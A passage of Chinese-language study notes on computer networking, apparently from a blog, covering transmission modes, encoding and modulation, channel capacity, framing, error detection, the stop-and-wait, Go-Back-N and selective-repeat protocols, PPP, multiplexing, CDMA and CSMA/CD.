串行传输和并行传输\n\n串行传输：指数据是一个比特一个比特依次发送的，只需要一条传输链路。数据在进行远距离传输的时候用的是串行传输，不是并行传输。\n\n并行传输：指一次发送n个比特而不是一个比特，为此在发送端和接收端之间需要有n条传输线路。并行传输的优点是速度为串行传输的n倍。缺点是成本高。计算机内部数据的传输一般使用并行传输。\n\n### 2.3.2 同步传输和异步传输\n\n同步传输：数据库以稳定的比特流形式传输，字节之间没有间隔。接收端在每个比特信号的中间时刻进行检测，以判别接收到的是比特0还是比特1。由于不同设备的时钟周期存在差异，不能做到完全相同，在传输大量数据的过程中判别时刻的累计误差会导致接收端对比特信号的判别位置错位，因此需要采取方法使收发双方的时钟保持同步。\n\n异步传输：使用异步传输方式时，以字节为独立的传输单位，字节之间的间隔时间不固定的(因此称为异步传输)。接收端仅在每个字节的起始处对字节内的比特实现同步。为此，通常要在每个字节的前后分别加上起始位和结束位。异步指的是字节之间异步。字节之间的时间间隔不固定。但是，字节中的每个比特依旧要同步，各个比特的持续时间要相同。\n\n{% asset_img 2.3.2.png 同步传输和异步传输 %}\n\n### 2.3.3 单工、半双工、全双工通信\n\n单工通信：通信双方只有一个数据传输方向，只需要一条信道。例如无线电、广播。\n\n半双工通信：通信双方有两个数据传输方向，但是不可以同时通信。需要两条信道。例如对讲机就是这种通信方式。\n\n全双工通信：通信双方有两个数据传输方向，可以进行同时通信。需要两条信道。例如实时电话就是这种通信方式。\n\n## 2.4 编码与调制\n\n{% asset_img 2.4.1.png 编码与调制 %}\n\n编码：编码就是在不改变信号性质的情况下仅对数字基带信号的波形进行变换。编码后产生的信号仍为数字信号。可以在数字信道中传输。\n\n调制：把数据基带信号的频率范围，搬移到较高的频段，并转换为模拟信号，称为调制。调制后产生模拟信号，在模拟信道中传输。\n\n码元：构成信号的一段波形。\n\n### 2.4.1 常用编码\n\n{% asset_img 2.4.2.png 常用编码 %}\n\n- 不归零编码(NRZ)：在整个码元时间内，不会出现零电平。为了辨别码元个数，在发送信号时需要发送方和接收方做到严格的同步。一般需要额外一根传输线来传输时钟信号，实现同步的目的。接收方按照时钟信号的节拍来逐个接收码元。但是额外一根线资源造成浪费，在计算机网络中的数据传输一般不采用这类编码。\n- 归零编码(RZ)：在传输过程中，每个码元传输结束后都要“归零”。因此接收方只要在信号归零后进行采样，而不需要单独的时钟信号。归零编码相当于把时钟信号用“归零”的方式放在了数据之内，看作一种自同步的信号。但是在传输过程中，大部分的数据带宽都用来传输零电平数据，造成资源浪费。编码效率低。\n- 反向不归零编码(NRZI)：在码元时间内不会出现零电平。若后一个码元时间内所持续的电平与前一个码元时间内所持续的电平不同(也称为电平反转)则表示0，若电平保持不变则表示1。\n- 曼彻斯特编码：在码元中间时刻会产生跳变，跳变的含义可以自己定义。例如由低电平到高电平代表1(或0)信号，由高电平到低电平代表0(或1)信号。码元中间时刻的跳变既代表时钟，又代表数据。传统以太网使用的就是曼彻斯特编码。\n- 差分曼彻斯特编码：在差分曼彻斯特编码中间也有跳变，但是此跳变只代表时钟信号。具体的数据由码元开始处电平是否变化来表示。例如在码元结束和码元开始的时候电平做对比，有变化代表0(或1)，无变化代表1(或0)。\n\n### 2.4.2 基本调制\n\n{% asset_img 2.4.3.png 基本调制 %}\n\n- 调幅：对基带信号的波幅进行调整，例如将上图的1信号波幅进行改变，在接收方读取时有载波输出为1。\n- 调频：对基带信号频率进行调整，例如将0信号调制为频率f1，1信号调制为频率f2。\n- 调相：对基带信号相位进行调制，例如将0信号的初相位调整为0度，1信号的初相位调整为180度。\n\n但是在以上基本调制方法中，1个码元只能包含1个比特信息。\n\n### 2.4.3 混合调制\n\n如果频率和相位混合调制，因为频率和相位是相关的，即频率是相位随时间的变化率。所以一次只能调制频率和相位两个中的一个。\n\n通常情况下，相位和振幅可以结合起来一起调制，称为正交振幅调制QAM。\n\n比如QAM-16，在QAM-16中有12种相位，每种相位有1或2种振幅可选择。\n\n{% asset_img 2.4.5.png 混合调制 %}\n\n由于此调制方法可以调制出16种码元，要完整的表示这16种情况，码元内是二进制数据，因此至少需要4个二进制数，也就是4个比特数据，因此在QAM-16调制方法中，每个码元可以表示4个比特数据。为了防止传输出错导致错误，相邻码元之间的对应关系使用格雷码(相邻二进制数只有一位不同)。\n\n{% asset_img 2.4.4.png 混合调制 %}\n\n## 2.5 信道的极限容量\n\n{% asset_img 2.5.1.png 信号失真 %}\n\n在实际传输过程中由于通信质量的问题会导致传输信号被干扰，导致信号波形失去了码元之间的清晰界限，这种现象叫码间串扰。\n\n### 2.5.1 奈氏准则\n\n为了防止信道数据过大导致码间串扰，因此做出了信号极限容量的预测。其中最著名的就是奈氏准则。\n\n奈氏准则：在假定的理想条件下，为了避免码间串扰，码元传输速率时有上限的。\n\n{% asset_img 2.5.2.png 奈氏准则 %}\n\n**奈氏准则计算公式**\n\n理想低通(无噪声)信道下极限数据传输速率：\n$$\nC=2W\\log_2{V}\n$$\n其中，C是数据传输速率（bit/s），W是信道带宽（Hz），V是信号状态数（可调制的不同波形的数量）。\n\n### 2.5.2 香农公式\n\n香农公式：带宽受限且有高斯白噪声干扰的信道的极限信息传输速率。\n\n{% asset_img 2.5.3.png 香农公式 %}\n\n在信道带宽一定的情况下，根据奈氏准则和香农公式，要想提高信息的传输速率就必须采用多元制(更好的调制方法)和努力提高信道中的信噪比。\n$$\n数据传输速率(比特/秒)=波特率(码元传输速率，码元/秒)×每个码元携带的信息量(比特/码元)\n$$\n\n# 3. 数据链路层\n\n## 3.1 数据链路层概述\n\n数据链路层的功能：实现数据在一个网络之间的传输。\n\n链路：从一个节点到一个相邻节点的一段物理线路，而中间没有任何其他交换节点。\n\n数据链路：数据链路是把实现通信协议的硬件和软件加到链路上构成的。\n\n数据链路以帧为单位传输和处理数据。\n\n{% asset_img 3.1.1.png 数据链路层的传输 %}\n\n## 3.2 数据链路层的三个重要问题\n\n### 3.2.1 封装成帧\n\n{% asset_img 3.2.1.png 封装成帧 %}\n\n封装成帧是把网络层交付的协议数据单元，添加帧头和帧尾的操作，称为封装成帧。主要目的是为了在链路上以帧为单元传输数据，从而实现数据链路层本身的功能。\n\n封装后的MAC帧格式：\n\n{% asset_img 3.2.2.png 帧的格式 %}\n\n### 3.2.2 差错检测\n\n差错检测：接收方主机收到帧后，通过检错码和检错算法，就可以判断出帧在传输过程中是否出现了误码。\n\n在传输过程中可能会产生比特差错：1 可能会变成 0， 而 0 也可能变成 1。\n\n{% asset_img 3.2.3.png 差错检测 %}\n\n1. 发送方会基于发送的数据和检错算法计算出检错码，并放在帧尾。\n2. 接收方主机根据数据链路层放在帧尾的检错码和检错算法来判断传输过程是否有错误。\n3. 若接收方主机收到有误码的帧后，将该帧丢弃。\n\n### 3.2.3 可靠传输\n\n如果数据链路层向其上层提供的是不可靠服务，丢弃就丢弃了，不会有更多措施；如果数据链路层向其上层提供的是可靠服务，就还需要其它措施，确保接收方主机还可以重新收到被丢弃的这个帧的正确副本。\n\n可靠传输是数据链路层中最基本、最重要的问题。\n\n以上三个问题都是使用点对点信道的数据链路层来举例的。如果使用广播信道的数据链路层除了包含上面三个问题外，还有一些问题要解决：\n\n1. 在发送信号过程中，如何识别是否发送的是给目的主机？\n\n   {% asset_img 3.2.4.png 广播信道 %}\n\n   在发送数据过程中，信号是以广播的形式发送，因此数据中需要带有发送主机和目的主机地址，来实现识别主机的目的。常用的解决方法是编址：将帧的目的地址添加在帧中一起传输。\n\n   {% asset_img 3.2.5.png MAC编址的帧 %}\n\n2. 数据碰撞：在数据发送过程中可能出现有两个主机同时发送数据，就会造成数据碰撞。\n\n   {% asset_img 3.2.6.png 数据碰撞 %}\n\n   常用的解决方法就是控制协议：CSMA/CD。\n\n随着技术的发展，交换技术的成熟，在有线（局域网）领域使用点对点链路和链路层交换机的交换式局域网取代了共享式局域网，在无线局域网中仍然使用的是共享信道技术。\n\n## 3.3 封装成帧\n\n(看3.2.1)\n\n在物理层中会将构成帧的各比特，转换成电信号交给传输媒体，为了便于接收方数据链路层从物理层交付比特流中提取出一个一个的帧，因此需要帧头跟帧尾来做一个帧定界，来实现从比特流中提取出一个一个的帧。\n\n{% asset_img 3.3.1.png PPP帧格式 %}\n\n例如在ppp帧的格式中，在帧头和帧尾各有一个帧定界标志，由1子节组成，其01111110和01111110所包裹的数据就是一个帧，数据链路层可以识别这个帧定界从而提取出一个帧。\n\n但是也存在没有帧定界标志的数据链路层协议：比如MAC帧，该帧的提取由物理层添加的前导码来识别开始，并且按照稳定的时钟周期，在每一帧的结束会有96比特发送时间的间隔，以此来识别一个帧的结束。\n\n前导码由两部分组成：前同步码，作用是使接收方的时钟同步；帧开始定界符，表明其后面紧跟着的就是MAC帧。\n\n### 3.3.1 透明传输\n\n透明传输：是指数据链路层对上层交付的传输数据没有任何限制，就好像数据链路层不存在一样。\n\n{% asset_img 3.3.2.png 透明传输 %}\n\n在传输数据过程中可能会出现数据比特流与帧定界标志符一样的情况，造成误读定界标志导致传输错误。在这种情况下，说明数据链路层对于数据有了一个要求：不能存在与定界符一样的数据编码。这就代表着对上层交付的数据有了限制，就不是透明传输了。因此为了实现透明传输，需要在数据链路层对数据进行处理。\n\n在数据链路层中会对数据的处理来实现透明传输功能，例如：字节填充、比特填充，主要思路是在每一个传输数据中出现的定界符进行转义，防止误读。\n\n**字节填充**：在面向字节的物理链路中适用。主要步骤：\n\n1. 通过在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是1B)。\n2. 接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。\n3. 如果转义字符也出现在数据当中，那么应在转义字符前面插入一个转义字符 ESC。当接收端收到连续的两个转义字符时，就删除其中前面的一个。\n\n**比特填充**：适用于面向比特传输的物理链路。主要步骤：\n\n1. 在数据链路层中发送帧前扫描帧的数据部分，若出现连续的5个1，将在5个1后插入1个0(因为帧定界标志符为01111110)。\n2. 在接收方数据链路层接收帧时，将帧的数据部分中的每5个1后面的0剔除即可。\n\n为了提高帧的传输效率，应当使帧的数据部分的长度尽可能大些。但考虑到差错控制等多种因素，每一种数据链路层协议都规定了帧的数据部分的长度上限，即最大传送单元(MTU，Maxinum Transfer Unit)。\n\n## 3.4 差错检测\n\n(看3.2.2)\n\n比特差错：实际的通信链路都不是理想的，比特在传输过程中可能会产生差错: 1可能会变成0，而0也可能变成1。\n\n误码率(BER)：在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率(BER，Bit Error Rate)\n\n差错检测码(FCS)：使用差错检测码来检测数据在传输过程中是否产生了比特差错，是数据链路层所要解决的重要问题之一。\n\n### 3.4.1 奇偶校验\n\n{% asset_img 3.4.1.png 奇偶校验 %}\n\n由于奇偶校验的漏检率比较高，因此一般在数据链路层中不使用。\n\n### 3.4.2 循环冗余校验(CRC，Cyclic Redundancy Check)\n\n循环冗余检验是一种可靠性非常高的校验方法。\n\n{% asset_img 3.4.2.png CRC %}\n\n{% asset_img 3.4.3.png CRC %}\n\n{% asset_img 3.4.5.png CRC %}\n\n{% asset_img 3.4.4.png CRC %}\n\n{% asset_img 3.4.6.png CRC %}\n\n## 3.5 可靠传输\n\n(看3.2.3)\n\n### 3.5.1 可靠传输基本概念\n\n使用差错检测技术(例如循环冗余校验CRC)，接收方的数据链路层就可检测出帧在传输过程中是否产生了误码(比特错误)。\n\n数据链路层向上层提供的服务类型：\n\n- 不可靠传输服务：仅仅丢弃有误码的帧，其他什么也不做；\n- 可靠传输服务：想办法实现发送端发送什么，接收端就收到什么。\n\n一般情况下，有线链路的误码率比较低，为了减小开销，并不要求数据链路层向上提供可靠传输服务。即使出现了误码，可靠传输的问题由其上层处理。无线链路易受干扰，误码率比较高，因此要求数据链路层必须向上层提供可靠传输服务。\n\n比特差错只是传输差错中的一种。从整个计算机网络体系结构来看，传输差错还包括分组丢失、分组失序以及分组重复。\n\n- 分组丢失：路由器输入队列由于空间不足，主动丢弃收到的分组，造成分组丢失。\n- 分组失序：由于传输过程中选择失序的问题，接收方实际收到的数据与发送方发送的分组顺序不同造成分组失序。\n- 分组重复：分组在传输过程中由于某种原因在线路中滞留，导致一定时间内没有到达接收方，触发发送方超时重传机制，最终导致接收方收到了两个相同分组，造成分组重复。\n\n分组丢失、分组失序以及分组重复这些传输差错，一般不会出现在数据链路层，而会出现在其上层。因此可靠传输服务并不仅局限于数据链路层，其它各层均可选择实现可靠传输。\n\n{% asset_img 3.5.1.png 可靠传输 %}\n\nTCP/IP体系结构中的以太网便不要求数据链路层实现可靠传输。\n\n可靠传输的实现比较复杂，开销也比较大，是否使用可靠传输取决于应用需求。\n\n### 3.5.2 三种可靠传输实现机制\n\n可靠传输服务并不局限于数据链路层，在其他各层协议均可选择实现。\n\n#### 3.5.2.1 停止-等待协议(SW，Stop and Wait)\n\n停止-等待协议：发送方每发送一个分组，就停止发送并等待接收方的确认分组。当收到接收方的确认分组后，才能发送下一个数据分组，如此反复进行。\n\n停止-等待协议有4个最基本原则：\n\n{% asset_img 3.5.2.1.png 停止-等待协议 %}\n\n1. 确认与否认。在每个数据发送后，接收方接到后会发送ACK(确认)信号确认无误收到，发送方收到ACK信号后便开始发送下一个数据。\n\n   接收方检测收到数据出现误码后，会发送NAK(否认)信号，发送方接收到NAK信号后会重新发送缓存区中的数据。\n\n   因此，在此过程中，发送方与接收方一直处于一种停止等待对方的过程，在此过程中要进行确认与否认，这也是停止-等待协议的最基本原则。\n\n2. 超时重传。此原则可以避免当数据传输过程中出现丢失，导致接收方一直等不到数据传送到达，而发送方又在等待接收方发送确认信号，系统处于互等的请况。\n\n   为解决该问题，可以在发送方发送完一个数据分组时，启动一个超时计时器。若到了超时计时器所设置的重传时间而发送方仍收不到接收方的任何ACK或NAK，则重传原来的数据分组，这就叫超时重传。\n\n   一般可将重传时间选为略大于“从发送方到接收方的平均往返时间”。\n\n3. 确认丢失。此原则可以避免接收方发送ACK信号后，由于传输问题出现ACK信号丢失，导致发送方没收到确认信号，重传分组，此时接收方重新接收到一样的分组，造成分组重复错误。\n\n   为避免分组重复这种传输错误，必须给每个分组带上序号。对于停止-等待协议，由于每发送一个数据分组就停止等待，只要保证发送一个新的数据分组，其发送序号与上次发送的数据分组序号不同即可，因此用一个比特来编号就足够了。\n\n4. 确认迟到。此原则可以避免接收方发送ACK信号后，由于传输问题出现ACK信号迟到，导致发送方没收到确认信号，重传分组，下一时刻ACK到达，开始传输下一个分组，但是此时超时重传的分组已经发送出去，接收方接收到后会发送一个一样的ACK信号。\n\n   所以同样需要给ACK或NAK信号编号。但在点对点通信中，传输的时钟周期比较固定，很少出现确认迟到的情况，可以不用给确认分组编号。\n\n**注意事项**：\n\n- 接收端检测到数据分组有误码时，将其丢弃并等待发送方的超时重传。但对于误码率较高的点对点链路，为使发送方尽早重传，也可给发送方发送NAK分组。\n- 为了让接收方能够判断所收到的数据分组是否是重复的，需要给数据分组编号。由于停止-等待协议的停等特性，只需1个比特编号就够了，即编号0和1。\n- 为了让发送方能够判断所收到的ACK分组是否是重复的，需要给ACK分组编号，所用比特数量与数据分组编号所用比特数量一样。\n- 点对点信道的数据链路层一般不会出现ACK分组迟到的情况，因此在数据链路层实现停止-等待协议可以不用给ACK分组编号。\n- 超时计时器设置的重传时间应仔细选择。一般可将重传时间选为略大于“从发送方到接收方的平均往返时间”。\n  - 在数据链路层点对点的往返时间比较确定，重传时间比较好设定。\n  - 然而在运输层，由于端到端往返时间非常不确定，设置合适的重传时间有时并不容易。\n\n**停止-等待协议的信道利用率**\n\n信道利用率就是发送方发送时延占据整个事件比例。\n\n- $T_D$：数组分组的发送时延\n- $T_A$：接收方主机的处理时延\n- $RTT$：往返时延\n\n则停止-等待协议的信道利用率计算公式$U$为：\n$$\nU=\\frac{T_D}{T_D+RTT+T_A}\n$$\n{% asset_img 3.5.2.2.png 信道利用率 %}\n\n当往返时延RTT远大于数据帧发送时延TD时(卫星链路)，信道利用率非常低。若出现超市重传，信道利用率更低，因此就出现了另外两种协议：回退N帧协议GBN、选择重传协议SR。\n\n#### 3.5.2.2 回退N帧协议(GBN，Go-Back-N)\n\n回退N帧协议可以理解为停止等待协议的一种优化，在相同的时间内，使用停止-等待协议的发送方只能发送一个数据分组，而采用流水线传输的发送方，可以发送多个数据分组。\n\n{% asset_img 3.5.2.3.png 回退N帧协议 %}\n\n回退N帧协议在流水线传输的基础上，利用发送窗口限制发送方可连续发送数据分组的个数。\n\n1. 使用3个比特给分组编序号，0~7\n2. 发送窗口的尺寸$W_T$取值：$1 < W_T \\le 2^3-1$，本例取$W_T=5$\n3. 接收窗口$W_R$的取值：$W_R=1$\n\n当$W_T=1$为停止-等待协议SW。 \n\n**对于发送过程无差错情况**：\n\n{% asset_img 3.5.2.4.png 无差错情况 %}\n\n发送方将序号落在发送窗口内的0~4号数据分组，依次连续发送出去。分组经过互联网传输正确到达接收方，没有乱序和误码，接收方按序接收它们，每接收一个，接收窗口就向前滑动一个位置，并给发送方发送针对所接收分组的确认分组，在通过互联网的传输正确到达了发送方。发送方每接收一个，发送窗口就向前滑动一个位置，这样就有新的序号落入发送窗口，发送方可以将收到确认的数据分组从缓存中删除了，而接收方可以择机将已接收的数据分组交付上层处理。\n\n累计确认：接收方不一定要对收到的数据分组逐个发送确认，而可以在收到几个数据分组后(由具体实现)，对按序到达的最后一个数据分组发送确认，ACKn表示序号为n及以前的所有数据分组都已正确接收。比如即使 ACK1丢失了，也有ACK4来确认，发送方也可能不必重传。\n\n- 累计确认的优点：减少接收方的开销，减少对网络资源的占用。\n- 累计确认的缺点：不能向发送方及时发送接收方正确接受数据分组的信息。\n\n**对于有差错情况**：\n\n{% asset_img 3.5.2.5.png 有差错情况 %}\n\n{% asset_img 3.5.2.6.png 有差错情况 %}\n\n在传输过程中，5号数据分组出现错误，接收方在接收5号分组时通过其检错码发现了错误，于是丢弃该分组。而后续到达的分组通过对比序号发现序号不匹配，接收方就选择不接受它们，将它们丢弃，并且回传按序接受的最后一个正确数据分组，发送ACK4，每丢弃一个分组就发送一个最后正确数据分组信号。\n\n{% asset_img 3.5.2.7.png 有差错情况 %}\n\n在本例中，尽管序号为6,7,0,1的数据分组正确到达接收方，但由于5号数据分组误码不被接受，它们也“受到牵连”而不被接受。发送方还要重传这些数据分组，这就是所谓的 Go-back-N (回退N帧)。可见，当通信线路质量不好时，回退N帧协议的信道利用率并不比停止-等待协议高。\n\n回退N帧协议在流水线传输的基础上利用发送窗口来限制发送方连续发送数据分组的数量，是一种连续自动重传请求(ARQ，Automatic Repeat-reQuest)协议。在协议的工作过程中发送窗口和接收窗口不断向前滑动，因此这类协议又称为滑动窗口协议。\n\n{% asset_img 3.5.2.8.png 超过Wt范围上限 %}\n\n在实际传输过程中，假设所有的分组都被接收，此时发送一个ACK7，但是ACK7在传输过程中丢失。此时发送方到一定时间后触发超时重传机制，重新发送0\\~7编号分组。此时接送方接收到后，会比对分组序号，发现分组序号符合当前窗口选择接收。但是此时0\\~7分组实际上已经接收过了，出现了分组重复差错。\n\n{% asset_img 3.5.2.9.png GBN %}\n\n回退N帧协议的缺点：一个数据分组的误码就会导致其后续多个数据分组不能被接收方接收而丢弃，尽管它们没有误码。这必然会导致发送方对这些数据分组的超时重传，对通信资源造成极大浪费。基于此，为了进一步提高传输性能，就提出了选择重传协议SR。\n\n#### 3.5.2.3 选择重传协议(SR，Selective Request)\n\n为了进一步提高性能，可设法只重传出现误码的数据分组。因此，接收窗口的尺寸$W_R$不应再等于1(而应大于1)，以便接收方先收下失序到达但无误码并且序号落在接收窗口内的那些数据分组，等到所缺分组收齐后再一并送交上层。这就是选择重传协议。\n\n注意：选择重传协议为了使发送方仅重传出现差错的分组，接收方不再采用累计确认，而需要对每个正确接收到的数据分组进行逐一确认。\n\n1. 使用3个比特给分组编序号，0~7\n2. 发送窗口的尺寸$W_T$取值：$1 < W_T \\le 2^3-1$，本例取$W_T=4$\n3. 接收窗口$W_R$的取值：$W_R=W_T=4$\n\n选择重传协议的基本流程：\n\n1. 发送方将发送窗口内分组0123发送给接收方，且此时2号分组出现丢失。\n\n   {% asset_img 3.5.2.10.png SR %}\n\n2. 接收方能正确接收0，1序号分组，并且发送ACK0，ACK1。并且此时接收窗口向前滑动。\n\n   {% asset_img 3.5.2.11.png SR %}\n\n3. 接收方接收3号数据分组，并且发送ACK3，但是由于此时2号分组没有收到，不能向后滑动窗口，只能继续接收剩余窗口。此时发送方会对发送窗口中的3号数据做已确认标记，防止超时重发。\n\n   {% asset_img 3.5.2.12.png SR %}\n\n4. 此时发送方收到ACK0，ACK1将窗口向后滑动，并且将4，5号数据发送出去。\n\n5. 接收方接收到4，5号分组后，回传ACK4，ACK5。\n\n   {% asset_img 3.5.2.13.png SR %}\n\n6. 2号数据触发超时重传机制，此时将2号数据发送过去，接收方接收到后回传ACK2，并且此接收方有序并且已确认分组已经连续，向后滑动窗口。\n\n7. 发送方接收到ACK2信号后，所有发送窗口都满足确认，并且已经连续，发送窗口也向后滑动。\n\n8. 重复上述过程，直至完成所有分组的传输。\n\n如果发送窗口和接收窗口超过了取值范围，就会使接收方无法区分新、旧数据分组，进而出现分组重复这种差错。\n\n{% asset_img 3.5.2.15.png 分组重复 %}\n\n{% asset_img 3.5.2.16.png SR总结 %}\n\n## 3.6 点对点协议(PPP)\n\n点对点协议(PPP，Point-to-Point Protocol)是目前使用最广泛的点对点数据链路层协议。\n\nPPP协议是数据链路层使用的一种协议，它的特点是：简单；只检测差错，而不是纠正差错；不使用序号，也不进行流量控制；可同时支持多种网络层协议。\n\nPPP协议为在点对点链路传输各种协议数据报提供了一个标准方法，主要由以下三部分构成：\n\n- 对各种协议数据报的封装方法(封装成帧)\n- 链路控制协议(LCP)：用于建立、配置以及测试数据链路的连接\n- 一套网络控制协议(NCPs)：其中的每一个协议支持不同的网络层协议\n\n### 3.6.1 PPP的帧格式\n\n{% asset_img 3.5.3.1.png PPP的帧格式 %}\n\n### 3.6.2 点对点协议透明传输\n\nPPP实现透明传输的两种方法：\n\n- 面向字节的异步链路采用插入转义字符的字节填充法\n- 面向比特的同步链路采用插入比特 0 的比特填充法\n\n{% asset_img 3.5.3.2.png 异步链路透明传输 %}\n\n{% asset_img 3.5.3.3.png 同步链路透明传输 %}\n\n### 3.6.3 差错检测\n\n{% asset_img 3.5.3.4.png 差错检测 %}\n\n### 3.6.4 工作状态\n\n{% asset_img 3.5.3.5.png 工作状态 %}\n\n## 3.7 媒体接入控制(MAC)\n\n### 3.7.1 基本概念\n\n数据媒体接入控制(MAC，Medium Access Control)，其要着重考虑的问题就是如何协调多个发送和接收站对一个个共享传输媒体的占用，也就是解决冲突的问题。\n\n{% asset_img 3.5.4.1.png MAC %}\n\n随着技术的发展，交换技术的成熟和成本的降低，具有更高性能的使用点对点链路和链路层交换机的交换式局域网在有线领域已完全取代了共享式局域网，但由于无线信道的广播天性，无线局域网仍然使用的是共享媒体技术。\n\n### 3.7.2 静态划分信道\n\n预先固定分配好信道，这类方法非常不灵活，对于突发性数据传输信道利用率会很低。通常在无线网络的物理层中使用，而不是在数据链路层中使用。\n\n复用是通信技术中的一个重要概念，复用就是通过一条物理线路同时传输多路用户的信号。当网络中传输媒体的传输容量大于多条单一信道的总通信量时，就可以利用复用技术在一条物理线路上建立多条通信信道来充分利用传输媒体的带宽。\n\n常用的复用技术有4种：频分复用FDM、时分复用TDM、波分复用WDM、码分复用CDM。\n\n#### 3.7.2.1 频分复用FDM\n\n频分复用FDM：将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。\n\n频分复用的所有用户在同样的时间占用不同的带宽资源（注意，这里的“带宽”是频率带宽而不是数据的发送速率）。\n\n接收端通过相应的分用器通过滤波将各路信号分开。将合成的复用信号恢复成原始的多路信号。\n\n{% asset_img 3.5.4.2.1.png 频分复用FDM %}\n\n#### 3.7.2.2 时分复用TDM\n\n- 将时间划分成一个个的时间间隙。\n- 时分复用技术将传输线路的带宽资源按一个个的时间间隙轮流分配给不同的用户。\n- 每个用户只在所分配的时隙里使用线路传输数据。\n\n{% asset_img 3.5.4.2.2.png 时分复用TDM %}\n\n- 时分复用是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。\n- 每一个用户所占用的时隙是周期性地出现（其周期就是TDM帧的长度）的。\n- TDM 信号也称为等时 (isochronous) 信号。\n- 时分复用的所有用户在不同的时间占用同样的频带宽度。\n\n#### 3.7.2.3 波分复用WDM\n\n波分复用就是光的频分复用。\n\n光信号传输一段距离后会衰减，所以要用掺铒光纤放大器放大光信号。\n\n{% asset_img 3.5.4.2.3.png 波分复用WDM %}\n\n#### 3.7.2.4 码分复用CDM\n\n码分复用，由于该技术主要用于多址接入，人们更常用的名词时码分多址CDMA（Code Division Multiple Access）\n\n同理：频分复用（FDM）和时分复用（TDM）都可用于多址接入，相应的名词是频分多址（FDMA）和时分多址（TMDA）。\n\n复用和多址的区别：\n\n{% asset_img 3.5.4.2.4.png 复用和多址的区别 %}\n\n与FDM和TDM不同，CDM的每一个用户可以在同样的时间使用同样的频带进行通信。\n\n由于各用户经过特殊挑选的不同码型，因此个用户之间不会造成干扰。\n\nCDM最初是用于军事通信的，因此这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易于被敌人发现。随着技术的进步，CDMA设备的价格和体积都大幅度下降，因为现在已广泛用于民用的移动通信中。\n\n在CDMA中，每一个比特时间再划分为m个短的间隔，称为码片(Chip)。通常m=64或128。为了简单起见，在后续的举例中，假设m为8。(注意：1个比特时间是指发送1个比特所花费的时间)\n\n使用CDMA的每一个站被指派一个唯一的m bit码片序列(Chip Sequence)。\n\n- 一个站如果要发送比特1，则发送它自己的m bit码片序列\n- 一个站如果要发送比特0，则发送它自己的m bit码片序列的二进制反码\n\n{% asset_img 3.5.4.2.5.png 码片举例 %}\n\n这种通信方式称为序列扩频DSSS。\n\n码片序列的挑选原则如下:\n\n- 分配给每个站的码片序列必须各不相同，实际常采用伪随机码序列。\n\n- 分配给每个站的码片序列必须相互正交(规格化内积为0)。\n\n  令向量 S 表示站 S 的码片序列，令向量 T 表示其他任何站的码片序列\n\n  两个不同站 S 和 T 的码片序列正交，就是向量 S 和 T 的规格化内积为 0\n  $$\n  S·T\\equiv\\frac 1m\\sum_{i=1}^mS_iT_i=0\\\\\n  S·\\overline T\\equiv\\frac1m\\sum_{i=1}^mS_i\\overline T_i=0\\\\\n  S·S\\equiv\\frac1m\\sum_{i=1}^mS_iS_i=\\frac1m\\sum_{i=1}^mS_i^2=\\frac1m\\sum_{i=1}^m(±1)^2=1\\\\\n  S·\\overline S\\equiv\\frac1m\\sum_{i=1}^mS_i\\overline S_i=-1\n  $$\n\n{% asset_img 3.5.4.2.6.png 习题1 %}\n\n{% asset_img 3.5.4.2.7.png 习题2 %}\n\n{% asset_img 3.5.4.2.8.png 习题2 %}\n\n{% asset_img 3.5.4.2.9.png 习题3 %}\n\n### 3.7.3 动态接入控制\n\n对于动态接入控制，我们主要关注随机接入。\n\n最初的以太网是将许多计算机都连接到一根总线上。易于实现广播通信。当初认为这样的连接方法既简单又可靠，因为总线上没有源器件。\n\n{% asset_img 3.5.4.3.1.png 碰撞 %}\n\n但是在多个主机共用一个总线时，避免不了会出现碰撞的问题。如何协调总线各个主机的工作，尽量避免碰撞是一个必须解决的重要问题。因此就出现了载波监听多址接入/碰撞检测 CSMA/CD协议，用于解决碰撞问题。\n\n随机接入分为总线型局域网和无线型局域网。总线型局域网使用的是CSMA/CD协议。无线型局域网使用的是CSMA/CA协议。\n\n#### 3.7.3.1 CSMA/CD协议\n\n载波监听多址接入/碰撞检测(CSMA/CD，Carrier Sense Multiple Access/Collision Detection)\n\n1. 多址接入(MA)：多个站连接在一条总线上，竞争使用总线\n\n2. 载波监听(CS)：每一个站在发送帧之前先要检测一下总线上是否有其它站点在发送帧（“先听后说”）\n\n   - 若检测到总线空闲 96 比特时间，则发送这个帧\n   - 若检测到总线忙，则继续检测并等待总线转为空闲 96 比特时间，然后发送这个帧\n\n   其中，96比特时间是发送96比特需要的时间(帧间最小间隔)，其作用是可以检测出一个帧的结束。\n\n   {% asset_img 3.5.4.3.2.png 载波监听 %}\n\n   但是实际上，总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其它计算机发送的数据信号。\n\n3. 碰撞检测(CD)：每一个正在发送帧的站边发送边检测碰撞（“边说边听”）\n\n   - 一旦发现总线上出现碰撞，则立即停止发送，退避一段随机时间后再次发送(“一旦冲突，立即停说，等待时机，重新再说”)\n\n   {% asset_img 3.5.4.3.3.png 碰撞检测 %}\n\n   “碰撞检测”就是计算机边发送数据边检测信道上的信号电压大小。当几个站同时在总线上发送数据时，总线上的信号电压摆动值将会增大(互相叠加)。当一个站检测到的信号电压摆动值超过一定的门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞。所谓“碰撞”就是发生了冲突。因此碰撞检测也称冲突检测。在发生碰撞时，总线上传输的信号产生了严重的失真，无法从中恢复出有用的信息来。\n\n**争用期(碰撞窗口)**\n\n- $\\tau$：以太网单程端到端传播时延。\n- $\\delta$：站发送数据到站检测到碰撞所经历的一段时间。\n- $t$：纵轴向下，时间的正向进行。\n- 电磁波在 1km 电缆传播时延约等于 $5\\mu$s\n\n{% asset_img 3.5.4.3.4.png 碰撞窗口 